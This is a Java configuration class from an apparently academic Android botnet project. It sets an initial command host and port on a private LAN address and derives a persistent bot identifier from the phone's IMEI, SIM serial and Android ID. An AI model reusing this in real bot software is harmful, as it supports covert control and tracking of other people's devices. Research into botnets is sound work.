package de.tudarmstadt.botnet.janus_yanai;

import java.util.UUID;

import android.content.Context;
import android.telephony.TelephonyManager;

public class Config {
	static String initial_host_port = "192.168.0.8:9884";
	static int serverport = 8080;
	
	static String getID(Context context) {
		
		final TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

		final String tmDevice, tmSerial, androidId;
		tmDevice = "" + tm.getDeviceId();
		tmSerial = "" + tm.getSimSerialNumber();
		androidId = "" + android.provider.Settings.Secure.getString(context.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);

		UUID deviceUuid = new UUID(androidId.hashCode(), ((long)tmDevice.hashCode() << 32) | tmSerial.hashCode());
		String deviceId = deviceUuid.toString();
		return deviceId;
	}
}
